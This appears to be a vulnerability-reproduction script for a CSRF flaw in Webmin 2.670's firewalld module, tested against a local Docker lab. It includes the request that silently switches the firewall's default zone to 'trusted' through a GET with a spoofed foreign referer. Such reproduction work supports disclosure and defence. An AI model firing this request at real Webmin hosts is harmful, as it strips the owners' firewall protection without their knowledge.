#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Mail    : abraxas.null@proton.me
#
#  CVE: webmin-firewalld-csrf (High: 8.0)
#  Vendor: Webmin
#  Versions: Webmin 2.670
#  Impact: firewalld/index.cgi CSRF sets default zone trusted
#  Requires: Docker, git, python3
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "webmin-firewalld-csrf"
_EMAIL = "abraxas.null@proton.me"

_RST = "\033[0m"
_BLD = "\033[1m"
_CYAN = (0, 255, 249)
_MAGENTA = (255, 0, 212)
_PINK = (255, 77, 224)
_GREEN = (57, 255, 20)
_GOLD = (255, 230, 0)
_AMBER = (255, 201, 70)
_RED = (255, 64, 96)
_MUTED = (140, 155, 175)
_INK = (232, 255, 248)
_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    if not _on():
        return ""
    return f"\033[38;2;{r};{g};{b}m"


def _paint(text, rgb, bold=False):
    if not text or rgb is None:
        return text or ""
    prefix = _rgb(*rgb) + (_BLD if bold else "")
    return "".join(ch if ch == " " else prefix + ch for ch in text)


def _box(inner, border):
    edge = _rgb(*border) + "║" + _RST
    return edge + " " + inner + _RST + " " + edge


def _rule(left, right, border, width):
    return _rgb(*border) + left + "═" * (width - 2) + right + _RST


def _split(text, left_end, right_start, left_rgb, right_rgb, mid_rgb=None, left_bold=False):
    return (
        _paint(text[:left_end], left_rgb, bold=left_bold)
        + _paint(text[left_end:right_start], mid_rgb)
        + _paint(text[right_start:], right_rgb)
    )


def _fit(left, right, width, fill=" "):
    gap = max(width - len(left) - len(right), 1)
    return (left + fill * gap + right)[:width].ljust(width)


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line):
    width = max(len(line), 1)
    out = []
    quoted = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        quoted ^= ch == '"'
        if ch == '"':
            color = _AMBER if quoted else _GOLD
        elif quoted:
            color = _GOLD
        else:
            color = _rain(x, width)
        out.append(_rgb(*color) + ch)
    return "".join(out) + _RST


def _banner_width(cols):
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(row) for row in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    return content_w, box_w


def _title_row(width):
    left, right = " ABRAXAS LABS", "analyze · reverse · disclose"
    text = _fit(left, right, width)
    return _split(text, len(left), width - len(right), _CYAN, _MUTED, left_bold=True)


def _cve_row(width):
    left, right = " " + _CVE, "authorized research only"
    rest = max(width - len(left) - len(right), 3)
    text = (left + " local lab ".center(rest)[:rest] + right)[:width].ljust(width)
    return _split(text, len(left), width - len(right), _PINK, _GREEN, mid_rgb=_MAGENTA, left_bold=True)


def _mail_row(width):
    left, right = " Mail", _EMAIL
    text = _fit(left, right, width)
    return _split(text, len(left), width - len(right), _GOLD, _CYAN)


def _status_line():
    marks = {"[": _GREEN, "]": _GREEN, "*": _GREEN, "·": _PINK, "#": _PINK}
    text = "[*]  abraxas!null ready on #labs"
    return "".join(ch if ch == " " else _rgb(*marks.get(ch, _INK)) + ch for ch in text) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    content_w, box_w = _banner_width(cols)
    lines = [
        _rule("╔", "╗", _CYAN, box_w),
        _box(_title_row(content_w) + _RST, _CYAN),
        _rule("╠", "╣", _MAGENTA, box_w),
        _box(_cve_row(content_w) + _RST, _MAGENTA),
        _rule("╠", "╣", _MAGENTA, box_w),
    ]
    for glyph in _ART["abraxas"] + _ART["labs"]:
        vis = glyph[:content_w].ljust(content_w)
        lines.append(_box(_logo_line(vis), _MAGENTA))
    lines.extend([
        _rule("╠", "╣", _MAGENTA, box_w),
        _box(_mail_row(content_w) + _RST, _MAGENTA),
        _rule("╚", "╝", _CYAN, box_w),
        " " + _status_line(),
    ])
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _message_color(s):
    low = s.lower()
    stripped = s.lstrip()
    if low.startswith("success"):
        return _rgb(*_GREEN) + _BLD
    if low.startswith("fail"):
        return _rgb(*_RED) + _BLD
    if "user_id" in low:
        return _rgb(*_AMBER) + _BLD
    if low.startswith("status=") or "status=" in low[:20]:
        return _rgb(*_CYAN)
    if low.startswith("carrier"):
        return _rgb(*_MAGENTA)
    if stripped[:1] in "{[":
        return _rgb(*_GOLD)
    return _rgb(*_INK)


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    dest = kwargs.get("file", _sys.stdout)
    if dest is not _sys.stdout and dest is not _sys.stderr:
        _builtins.print(*args, **kwargs)
        return
    extra = {k: v for k, v in kwargs.items() if k != "sep"}
    _builtins.print(_message_color(s) + s + _RST, **extra)

print_abraxas_banner()
_builtins.print = _cprint

"""Webmin 2.670: firewalld/index.cgi referer-exempt GET CSRF sets default zone."""

import http.client
import os
import subprocess
from dataclasses import dataclass
from pathlib import Path
from urllib.parse import urlencode, urljoin, urlparse

LABEL = "WEBMIN-H24-FIREWALLD-CSRF"
WITNESS = "WEBMIN-H24-FIREWALLD-CSRF"
IMAGE = "webmin-lab:2.670"
PIN = "2.670"
HOST = "127.0.0.1"
PORT = 18450
BASE = f"http://{HOST}:{PORT}"
COMPOSE = os.environ.get("COMPOSE_PROJECT_NAME", "webmin-firewalld-csrf")
USER = "root"
PASSWORD = "labroot"
FOREIGN_REFERER = "http://evil.test/"
CSRF_PATH = "/firewalld/index.cgi?defzone=1&zone=trusted"
SINK_PATH = "/firewalld/default_zone.cgi?zone=trusted"
HERE = Path(__file__).resolve().parent
WITNESS_FILE = HERE / "witness" / "firewall-cmd.log"


class LabError(Exception):
    def __init__(self, reason: str) -> None:
        super().__init__(reason)
        self.reason = reason


@dataclass(frozen=True)
class HttpResult:
    status: int
    body: str
    headers: dict[str, str]
    cookies: dict[str, str]
    url: str


def parse_set_cookie(raw: list[tuple[str, str]]) -> dict[str, str]:
    cookies: dict[str, str] = {}
    for key, value in raw:
        if key.lower() != "set-cookie":
            continue
        pair = value.split(";", 1)[0]
        name, _, val = pair.partition("=")
        if name.strip():
            cookies[name.strip()] = val.strip()
    return cookies


def request(
    method: str,
    url: str,
    *,
    headers: dict[str, str] | None = None,
    data: bytes | None = None,
    timeout: int = 30,
) -> HttpResult:
    parsed = urlparse(url)
    path = parsed.path or "/"
    if parsed.query:
        path = f"{path}?{parsed.query}"
    hdrs = {
        "Host": f"{HOST}:{PORT}",
        "User-Agent": "H24Lab/1.0",
        "Connection": "close",
    }
    if headers:
        hdrs.update(headers)
    if data is not None:
        hdrs.setdefault("Content-Type", "application/x-www-form-urlencoded")
        hdrs["Content-Length"] = str(len(data))
    try:
        conn = http.client.HTTPConnection(HOST, PORT, timeout=timeout)
        try:
            conn.request(method, path, body=data, headers=hdrs)
            resp = conn.getresponse()
            raw_headers = resp.getheaders()
            payload = resp.read()
            status = resp.status
        finally:
            conn.close()
    except (OSError, http.client.HTTPException) as exc:
        raise LabError("unreachable") from exc
    return HttpResult(
        status,
        payload.decode("utf-8", errors="replace"),
        {key.lower(): value for key, value in raw_headers},
        parse_set_cookie(raw_headers),
        url,
    )


def cookie_header(cookies: dict[str, str]) -> str:
    return "; ".join(f"{name}={value}" for name, value in cookies.items())


def session_headers(sid: str, referer: str) -> dict[str, str]:
    return {
        "Cookie": cookie_header({"testing": "1", "sid": sid}),
        "Referer": referer,
    }


def rebase(location: str) -> str:
    parsed = urlparse(urljoin(f"{BASE}/", location))
    path = parsed.path or "/"
    if parsed.query:
        return f"{BASE}{path}?{parsed.query}"
    return f"{BASE}{path}"


def browser_get(url: str, sid: str, referer: str, max_hops: int = 6) -> list[HttpResult]:
    hops: list[HttpResult] = []
    current = url
    current_referer = referer
    for _ in range(max_hops):
        result = request("GET", current, headers=session_headers(sid, current_referer))
        hops.append(result)
        if result.status not in {301, 302, 303, 307, 308}:
            break
        location = result.headers.get("location")
        if not location:
            break
        current_referer = current
        current = rebase(location)
    return hops


def login() -> tuple[str, str]:
    posted = request(
        "POST",
        f"{BASE}/session_login.cgi",
        headers={
            "Cookie": cookie_header({"testing": "1"}),
            "Referer": f"{BASE}/session_login.cgi",
        },
        data=urlencode({"user": USER, "pass": PASSWORD, "page": "/"}).encode("ascii"),
    )
    sid = posted.cookies.get("sid", "")
    if posted.status != 302 or not sid or sid == "x":
        raise LabError(f"login-no-sid-{posted.status}")
    return sid, posted.headers.get("server") or ""


def compose_exec(*args: str) -> str:
    proc = subprocess.run(
        ["docker", "compose", "-p", COMPOSE, "exec", "-T", "webmin", *args],
        check=False,
        capture_output=True,
        text=True,
        cwd=HERE,
    )
    if proc.returncode != 0:
        return ""
    return (proc.stdout or "").strip()


def image_version() -> str:
    proc = subprocess.run(
        ["docker", "image", "inspect", IMAGE, "--format", "{{.Config.Labels.version}}"],
        check=False,
        capture_output=True,
        text=True,
    )
    return (proc.stdout or "").strip()


def witness_text() -> str:
    if WITNESS_FILE.is_file():
        text = WITNESS_FILE.read_text(encoding="utf-8", errors="replace")
        if text.strip():
            return text
    return compose_exec("cat", "/witness/firewall-cmd.log")


def finish(lines: list[str], last: str) -> int:
    print(last, flush=True)
    lines.append(last)
    (HERE / "poc-last-run.txt").write_text("\n".join(lines) + "\n", encoding="utf-8")
    return 0 if last.startswith("SUCCESS ") else 1


def main() -> int:
    lines: list[str] = []

    def note(msg: str) -> None:
        print(msg, flush=True)
        lines.append(msg)

    try:
        label_version = image_version()
        file_version = compose_exec("cat", "/etc/webmin/version")
        note(
            f"IOC image={IMAGE} label-version={label_version or 'missing'} "
            f"file-version={file_version or 'missing'}"
        )
        if PIN not in label_version and file_version != PIN:
            return finish(lines, f"FAIL {LABEL} image-label {WITNESS}")

        sid, server = login()
        note(f"IOC login-server={server or 'missing'} sid={int(bool(sid))}")

        WITNESS_FILE.unlink(missing_ok=True)
        blocked = request(
            "GET",
            f"{BASE}{SINK_PATH}",
            headers=session_headers(sid, FOREIGN_REFERER),
        )
        blocked_text = witness_text()
        note(
            f"IOC negative-status={blocked.status} "
            f"warning={int('Security Warning' in blocked.body)} "
            f"witness-empty={int(not blocked_text.strip())}"
        )
        if blocked.status == 302:
            return finish(lines, f"FAIL {LABEL} negative-redirect {WITNESS}")
        if "Security Warning" not in blocked.body:
            return finish(lines, f"FAIL {LABEL} negative-no-warning {WITNESS}")
        if "--set-default-zone" in blocked_text:
            return finish(lines, f"FAIL {LABEL} negative-sink {WITNESS}")

        hops = browser_get(f"{BASE}{CSRF_PATH}", sid, FOREIGN_REFERER)
        hop_ioc = ",".join(str(hop.status) for hop in hops)
        loc0 = hops[0].headers.get("location", "") if hops else ""
        note(f"IOC csrf-hops={hop_ioc} first-location={rebase(loc0) if loc0 else 'none'}")
        if not hops or hops[0].status != 302:
            status = hops[0].status if hops else 0
            return finish(lines, f"FAIL {LABEL} csrf-status-{status} {WITNESS}")
        if "default_zone.cgi" not in loc0:
            return finish(lines, f"FAIL {LABEL} csrf-no-sink-location {WITNESS}")
        if len(hops) < 2:
            return finish(lines, f"FAIL {LABEL} csrf-no-follow {WITNESS}")
        if "Security Warning" in hops[1].body:
            return finish(lines, f"FAIL {LABEL} csrf-follow-blocked {WITNESS}")

        marker = witness_text()
        note(f"IOC witness={marker.strip() or 'missing'}")
        if WITNESS not in marker or "--set-default-zone trusted" not in marker:
            return finish(lines, f"FAIL {LABEL} witness-missing {WITNESS}")
        return finish(lines, f"SUCCESS {LABEL} {WITNESS}")
    except LabError as exc:
        return finish(lines, f"FAIL {LABEL} {exc.reason} {WITNESS}")
    except OSError:
        return finish(lines, f"FAIL {LABEL} os-error {WITNESS}")


if __name__ == "__main__":
    raise SystemExit(main())

